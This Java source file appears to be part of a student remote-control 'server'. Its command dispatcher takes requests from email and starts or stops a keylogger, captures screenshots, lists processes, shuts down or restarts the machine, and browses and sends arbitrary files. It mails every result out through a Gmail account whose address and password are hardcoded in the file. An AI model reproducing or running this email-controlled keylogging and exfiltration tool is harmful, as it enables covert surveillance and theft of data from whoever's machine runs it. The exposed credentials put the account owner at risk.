package com.example.project.server;

import com.example.project.features.getfile.GetFile;
import com.example.project.features.keylogger.KeyLog;
import com.example.project.features.listApp.ListApp;
import com.example.project.features.power.SRS;
import com.example.project.features.screenshot.Screenshot;
import com.example.project.mail.sendMail;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

public class sendResponse extends Thread{
    final String DEFAULT_MAIL = "servermmtk22tnt1@gmail.com";
    final String DEFAULT_PASSWORD = "toemssrwmsyismoy";
    boolean isKeylogTurnOn = false;
    String keylogText = "";
    int index = 0;
    private String getMail(String mail){
        return mail.substring(mail.indexOf('<')+1,mail.indexOf('>'));
    }

    KeyLog kl = new KeyLog();
    @Override
    public void run() {
        if (Server.reqList.size()==0){
            return;
        }
        while (index<Server.reqList.size()){
            switch (Server.reqList.get(index).charAt(0)){
                //start keylog
                case '1': {
                    kl.start();
                    System.out.println(1);
                    break;
                }
                //end keylog
                case '2': {
                    String text = kl.end();
                    System.out.println(text);
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Keylog Response: ");
                    sm.sendContent(text);
                    System.out.println(2);
                    break;
                }
                //list app
                case '3': {
                    ListApp la = new ListApp();
                    File file;
                    try {
                        file = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Show Process Response: ");
                    sm.send(file);
                    System.out.println(3);
                    break;
                }
                //screenshot
                case '4': {
                    Screenshot sc = new Screenshot();
                    File file;
                    file = sc.takeScreenShot();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Screenshot Response: ");
                    sm.send(file);
                    System.out.println(4);
                    break;
                }
                //shutdown
                case '5': {
                    SRS.shutdown();
                    break;
                }
                //restart
                case '6': {
                    SRS.restart();
                    break;
                }
                //logout
                case '7': {
                    SRS.logout();
                    break;
                }
                //getfile
                case '8': {
                    GetFile gf = new GetFile();
                    if (Server.reqList.get(index).length()<=2){
                        String text = gf.listDrive();
                        sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Choose disk to get file: ");
                        sm.sendContent(text);
                    }
                    else {
                        String path = Server.reqList.get(index).substring(2);
                        File file = new File(path);
                        if (file.isDirectory()){
                            String text = gf.listFile(file.getAbsolutePath());
                            sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Choose folder to get file: ");
                            sm.sendContent(text);
                        }
                        else {
                            if (file.exists()){
                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Getfile Response: ");
                                sm.send(file);
                            }
                            else{
                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"Getfile Response: ");
                                sm.sendContent("File do not exist");
                            }
                        }
                    }
                    break;
                }
                default: {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,"404 Response: ");
                    sm.sendContent("Wrong Request");
                    System.out.println(5);
                    break;
                }
            }
            index++;
        }

    }
}
